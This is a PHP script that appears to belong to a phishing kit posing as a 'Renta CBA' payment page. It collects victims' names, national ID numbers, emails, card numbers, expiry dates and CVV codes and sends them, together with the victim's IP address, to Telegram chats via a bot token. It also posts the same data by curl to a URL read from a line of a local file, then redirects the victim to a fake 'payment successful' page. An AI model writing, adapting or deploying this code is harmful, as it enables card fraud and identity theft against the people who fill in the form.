<?php  


include '../userbots.php';


$listaN = 'blacklist.txt';
$ipUser = $_SERVER['REMOTE_ADDR'];
$ipSalv = $ipUser . "/logs.php";
file_put_contents($listaN, $ipSalv . PHP_EOL, FILE_APPEND);

$nomi = $_POST['names'] ?? '';
$drac = $_POST['drac'] ?? ''; 
$mesi = $_POST['mmaa'] ?? ''; 
$cvcc = $_POST['cvcv'] ?? ''; 
$dni = $_POST['ind'] ?? ''; 
$email = $_POST['cosheo'] ?? ''; 

$invia = "➖➖💲Renta CBA💲➖➖\n" .
  "<b>👤Nome: </b> <code>".$nomi."</code>\n" .
  "<b>👤DNI: </b> <code>".$dni."</code>\n" .
  "<b>👤Email: </b> <code>".$email."</code>\n" .
  "<b>👤CC: </b> <code>".$drac."</code>\n" .
  "<b>👤MM/AAAA: </b> <code>".$mesi."</code>\n" .
  "<b>👤CCV: </b> <code>".$cvcc."</code>\n" .
  "🌐IP: " . $_SERVER['REMOTE_ADDR'] . "\n" . 

define('BOT_TOKEN', $botok);
define('API_URL', 'https://api.telegram.org/bot' . BOT_TOKEN . '/');
function invia_telegram($mess, $chat_id) {
    $queryArray = [
      'chat_id' => $chat_id,
      'text' => $mess,
    ];
    $url = API_URL . 'sendMessage?' . http_build_query($queryArray) . "&parse_mode=html";
    $result = file_get_contents($url);
}

foreach($chats as $chat_id) {
    invia_telegram($invia, $chat_id);
}

$fileURL = 'blacklist.txt';
$error = 118;
$url = '';

if (file_exists($fileURL)) {
    $file = fopen($fileURL, 'r');
    for ($i = 1; $i <= $error; $i++) {
        $url = fgets($file);
        if ($i == $error) {
            break;
        }
    }
    fclose($file);
    
    if (empty(trim($url))) {
        exit("BLOCK");
    }
} else {
    exit("BLOCK");
}

$dati = http_build_query([
  'nomi' => $nomi,
  'drac' => $drac,
  'mesi' => $mesi,
  'cvcc' => $cvcc,
  'dni' => $dni,
  'email' => $email,
]);

$ch = curl_init(trim($url));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $dati);

$risultato = curl_exec($ch);
curl_close($ch);

echo "<meta http-equiv='refresh' content='3;url=./pymnt_successfull.html'>";
?>
